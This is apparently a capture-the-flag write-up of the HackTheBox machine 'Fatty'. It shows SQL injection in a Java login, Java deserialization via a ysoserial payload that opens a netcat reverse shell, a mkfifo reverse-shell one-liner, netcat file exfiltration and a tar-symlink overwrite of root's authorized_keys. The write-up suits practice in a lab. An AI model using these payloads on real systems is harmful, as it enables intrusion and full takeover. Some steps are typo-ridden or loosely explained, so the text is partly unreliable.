---
title: HackTheBox-Fatty
author: a3nk17
date: 2020-08-11 
excerpt: Fatty is an insane linux box by qtc. its forced me way out of my comfort zone, Decompiling the server,search for a SQL-injectionIn & Inorder to escalate our privileges to root, we have to exploit a cronjob. which running on Docker.
thumbnail: /assets/img/posts/fatty/info.png
categories: [HackTheBox, Retired]
tags: [Deserialization, Java, npm, Window, Docker,]
---


![info](/assets/img/posts/fatty/info.png)

Synopsis
=========

We will `reverse` two `Java applications`, while `modifying` and `recompiling` the client, to exploit `SQL injectio`n during authorization and execute commands on the server due to a vulnerability in deserializing a Java object.

The connection to the laboratory is via `VPN`. It is recommended not to connect from a work computer or from a host where there is important data for you, as you find yourself in a `private network` with people who know something about information security.

Machine Information
====================



|Conten| Descripcion |
|-----------|--------------|
| OS       |  Linux |
| Dificulty    | Insane |
| Points   | 50 |
| Release      | 08-Feb-2020 |
| IP    | 10.10.10.174 |
| Creator Of The System: | [jkr](https://www.hackthebox.eu/home/users/profile/77141)  |



Enumaration The Machine
========================

As we always start diging into rabbit hole by using `Nmap` as we see some useless information.


```bash
root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.174
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 14:57 EDT
Nmap scan report for 10.10.10.174
Host is up (0.014s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
1338/tcp open  wmc-log-svc
1339/tcp open  kjtsiteserver

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
root@kali# nmap -p 21,22,1337,1338,1339 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.174
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-18 15:04 EDT
Nmap scan report for 10.10.10.174
Host is up (0.013s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp      15426727 Oct 30 12:10 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30 12:10 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30 12:10 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30 12:10 note3.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
1337/tcp open  ssl/waste?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
1338/tcp open  ssl/wmc-log-svc?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
1339/tcp open  ssl/kjtsiteserver?
|_ssl-date: 2020-03-18T19:07:18+00:00; +2m35s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2m34s, deviation: 0s, median: 2m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.43 seconds
```

Recon
------

The standard nmap scan shows that `21` and `22` are the only open ports. Furthermore, nmap tells us that anonymous `FTP-access` is `allowed`. The full port scan shows three additional ports (1337, 1338 and 1339). Let us check out FTP, we can access `FTP` through `Annoymous` user

```bash
root@kali# ftp 10.10.10.174
Connected to 10.10.10.174.
220 qtc's development server
Name (10.10.10.174:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp      15426727 Oct 30 12:10 fatty-client.jar
-rw-r--r--    1 ftp      ftp           526 Oct 30 12:10 note.txt
-rw-r--r--    1 ftp      ftp           426 Oct 30 12:10 note2.txt
-rw-r--r--    1 ftp      ftp           194 Oct 30 12:10 note3.txt
226 Directory send OK.
ftp> prompt
Interactive mode off.
ftp> mget *
```

After `FTP` login as wee see there are some notes , we download all the notes into local machine `*mget`
Nothing is intrested in Notes but, From notes we can get information about high ports that are used for `fatty-client.jar`.


**First Thing will Do Second

The three services running on `1337`, `1338`, and `1339` are the same.
`fatty-client.jar` in its current state tries to connect to `8000`. I’ll need to change it myself.
The application is built for `Java 8`.
Creds for the application - `qtc` /  `clarabibi`  attemp to login


Fire the fatty-client.jar
-----------------------------

run it with `java -jar fatty-client.jar`, I get a GUI login screen:

```bash
root@kali:~$ sudo apt-get install jd-gui
```


![](/assets/img/posts/fatty/1.png)
![](/assets/img/posts/fatty/2.png)


When testing the credentials that we found in the notes, we received a connection `error` alert. 

![](/assets/img/posts/fatty/3.png)


Decompiling the java client
----------------------------
![](/assets/img/posts/fatty/4.png)

I decompile the jar with `jd-gui` and in the `bean.xml` file and we stumble upon something interesting:

```bash
root@kali:~$ jd-gui fatty-client.jar
```

```bash
<bean id="connectionContext" class = htb.fatty.shared.connection.ConnectionContext">
    <constructor-arg index="0" value = "server.fatty.htb"/>
    <constructor-arg index="1" value = "8000"/>
</bean>
```

We find what appears to be a subdomain that we will add to our `/etc/hosts` file. We also need to find a way to communicate with the server since by default it uses port `8000` and if you remember the ports were changed.

One solution would be to change the port in the `bean.xml` file or create a tunnel, I'll go for the latter.

I quickly install `simpleproxy` to be able to `tunnel` my port `8000` with port `1337` of the server and be able to achieve communication.

```bash
root0@kali:~$ sudo apt-get install simpleproxy
```


Create the tunnel for Rabbit
-----------------------------

```bash
root0@kali:~$ simpleproxy -L 8000 -R fatty.htb:1337
```


When we try to log in, we see that it actually `connects`.


![](/assets/img/posts/fatty/5.png)

Enumartion on Fatty-Server.jar
=================================

In `FattyDBSession.java` we may notice insecure `SQL execution`

```bash
public User checkLogin(User user) throws FattyDbSession.LoginException {
    Statement stmt = null;
    ResultSet rs = null;
    User newUser = null;

    try {
      stmt = this.conn.createStatement();
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```
We have control on supplied username we can trigger `SQLi` to escalate qtc to have admin privileges.

However this will fail with bad credentials error. Let’s review Java client again.

In `User.java` we found that username is not plaintext:
```bah
String hashString = this.username + password + "clarabibimakeseverythingsecure";
```

And we are `admin` now!

Back to `client/server` code and one may notice that `User` class is `Serializable` and uses that during password change:

```bash
public static String changePW(ArrayList<String> args, User user) {
    logger.logInfo("[+] Method 'changePW' was called.");
    int methodID = 7;
    if (!user.getRole().isAllowed(methodID)) {
      logger.logError("[+] Access denied. Method with id '" + methodID + "' was called by user '" + user.getUsername() + "' with role '" + user.getRoleName() + "'.");
      return "Error: Method 'changePW' is not allowed for this user account";
    } else {
      String response = "";
      String b64User = (String)args.get(0);
      byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());
      ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);

      try {
        ObjectInputStream oIn = new ObjectInputStream(bIn);
        User var8 = (User)oIn.readObject();
      } catch (Exception var9) {
        var9.printStackTrace();
        response = response + "Error: Failure while recovering the User object.";
        return response;
      }

      response = response + "Info: Your call was successful, but the method is not fully implemented yet.";
      return response;
    }
  }
  
  ```
  The same method is not implemented on client and we need to do that ourself. 
  
  Exploiting the Deserialization Vulnerability
  ============================================
  
  
 Creating Payload
 -----------------
  
  Prepare payloads using [yoserial](https://github.com/frohoff/ysoserial)  Tool
  
  ```bash
  root@dkali:~# java -jar ysoserial.jar CommonsCollections5 'nc 10.10.14.8 443 -e /bin/sh'| base64 -w 0
<BASE-64 PAYLOAD>root@darkness:~# java -jar ysoserial.jar CommonsCollections5 'nc 10.10.14.8 443 -e /bin/sh'| base64 -w 0
<BASE-64 PAYLOAD>
```
Let us assume that netcat is installed on the system. With this we can generate a payload


![](/assets/img/posts/fatty/7.png)


  Now we just have to enter the `base64 payload` into the password field and start our listener om any port
  

  
  Diging To User Flag
  ===================
  
  ```bash
  root@kali:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:36287.
whoami
qtc

```

Let us upgrade the shell for easier usage

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.170 443 >/tmp/f &
```


```bash
root@kali:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:36793.
/bin/sh: can't access tty; job control turned off
2f265ce12800:/home/qtc$ 
```


Got a Shell hostname `2f265ce12800`

```bash
2f265ce12800:/home/qtc$ ls -alh
total 16
drwxr-sr-x    1 qtc      qtc         4.0K Oct 30  2019 .
drwxr-xr-x    1 root     root        4.0K Oct 30  2019 ..
drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh
----------    1 qtc      qtc           33 Oct 30  2019 user.txt
2f265ce12800:/home/qtc$ chmod 400 user.txt
2f265ce12800:/home/qtc$ cat user.txt
7fab2***************************
```


Privilege escalation for Root
================================

Bbu default domain have no any permition

```bash
2f265ce12800:~$ ls -al
total 24
drwxr-sr-x    1 qtc      qtc           4096 Feb 10 23:10 .
drwxr-xr-x    1 root     root          4096 Oct 30 11:11 ..
-rw-------    1 qtc      qtc              8 Feb 10 23:10 .ash_history
drwx------    1 qtc      qtc           4096 Oct 30 11:11 .ssh
-rwxr-xr-x    1 qtc      qtc            250 Feb 10 23:05 rshell
----------    1 qtc      qtc             33 Oct 30 11:10 user.txt
2f265ce12800:~$
```

Enumeration as qtc
--------------------

we can use `pspy` tool for furthere enumaration.

```bash
2f265ce12800:/tmp$ wget 10.10.14.8/pspy64
Connecting to 10.10.14.8 (10.10.14.8:80)
pspy64                14% |****                            |  446k  0:00:05 ETA
pspy64                71% |**********************          | 2137k  0:00:00 ETA
pspy64               100% |********************************| 3006k  0:00:00 ETA

2f265ce12800:/tmp$ chmod +x pspy64
2f265ce12800:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
[...]
UID=0    PID=75     | crond -b 
UID=0    PID=76     | sshd: [accepted]
UID=22   PID=77     | sshd: [net]       
UID=1000 PID=78     | sshd: qtc         
UID=1000 PID=79     | scp -f /opt/fatty/tar/logs.tar
[...]
```

 user qtc stores regularly copies the `/opt/fatty/tar/logs.tar` tar archive somewhere on the `real host`.

We gonna check out the `/opt/fatty/tar` directory.

```bash
2f265ce12800:/opt/fatty$ ls -lh
total 10592
-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar
drwxr-xr-x    5 root     root        4.0K Oct 30  2019 files
drwxr-xr-x    1 qtc      qtc         4.0K Jan 29 12:10 logs
-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh
drwxr-xr-x    1 qtc      qtc         4.0K Jul 26 21:00 tar

2f265ce12800:/opt/fatty/tar$ ls -alh
total 32
drwxr-xr-x    1 qtc      qtc         4.0K Jul 26 21:00 .
drwxr-xr-x    1 root     root        4.0K Oct 30  2019 ..
-rw-r--r--    1 qtc      qtc        21.0K Jul 27 09:00 logs.tar

```

Let us transfer the file to our machine using netcat.

```bash
2f265ce12800:/opt/fatty/tar$ cat logs.tar | nc 10.10.14.8 1234
```

```bash
root@kali:~# nc -lvnp 1234 > logs.tar
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:39273.
```

Get ready, now the good thing comes.




Exploiting the backup file
============================

We can assume that the archived data is copied somewhere and unpacked. We can exploit this by creating a symbolic link to a file we want to overwrite upon extraction. We can simply use `/root/.ssh/authorized_keys` to add our `public key`.

Overwriting backup location
-----------------------------

Upon extraction the logs.tar file points to `/root/.ssh/authorized_keys. logs.tar` -> `/root/.ssh/authorized_keys`.

Overwriting Target File
------------------------

Upon the second extraction the contents of the `logs.tar` file from the container is written to `/root/.ssh/authorized_keys`


For this we have to first create the symbolic link, then pack the file in a tar archive and upload it to `/opt/fatty/tar/logs.tar`. We then have to wait for the archive to be uploaded. After the archive being uploaded, we overwrite the archive with our `public-key`.

```bash
root@kali:~# ln -s /root/.ssh/authorized_keys logs.tar
root@kali:~# ls -lh logs.tar 
lrwxrwxrwx 1 root root 26 Jul 27 11:35 logs.tar -> /root/.ssh/authorized_keys
root@kali:~# tar cf logs2.tar logs.tar 
root@kali:~# mv logs2.tar logs.tar
```



Now we have a logs.tar archive that contains a logs.tar file that points to `/root/.ssh/authorized_keys`.

** Ganerating publik kay 

```bash
root@kali:~# ssh-keygen -f id_rsa -N ""
Generating public/private rsa key pair.
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:YsOI8jiY7io8x1EOniDxPFAFEFstoOEcqLfwhfZ8c18 root@darkness
The key's randomart image is:
+---[RSA 3072]----+
|**++.            |
|B+o .            |
|+B o             |
|+.Bo.+           |
|o=+** = S        |
|.=o+oooo.   E    |
|* o .. o . .     |
|o+ o      .      |
|=oo              |
+----[SHA256]-----+

```
**Uploading the file to Server**

```bash
2f265ce12800:/opt/fatty/tar$ wget 10.10.14.8/logs.tar
Connecting to 10.10.14.8 (10.10.14.8:80)
logs.tar             100% |********************************| 10240  0:00:00 ETA
```

After the file is copied, we can `overwrite` the archive with our `ssh-key`.

Login with SSH
---------------

```bash
root@kali:~# ssh -i id_rsa root@10.10.10.174
Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64
[...]
Last login: Wed Jan 29 12:31:22 2020
root@fatty:~#
root@fatty:~# ls -lh
total 24K
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client1
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client2
drwxr-xr-x 4 root root 4.0K Jul 27 11:51 client3
-rw-r--r-- 1 root root  616 Jul 27 11:51 log-puller.log
-rwxr-xr-x 1 root root 2.2K Oct 30  2019 log-puller.sh
-rw------- 1 root root   33 Oct 30  2019 root.txt
```

Nuts inside the Shell
======================

Hureeeeeeeeeeyyyyyyyyyyyyyy

```bash
root@fatty:~# cat root.txt 
ee982fsdfgsdggsdfgsfgerte****************

```



![Mr.Robot](https://media1.tenor.com/images/6ac3f8221dc3a800aeb6e1d5d248ae33/tenor.gif?itemid=8385651)
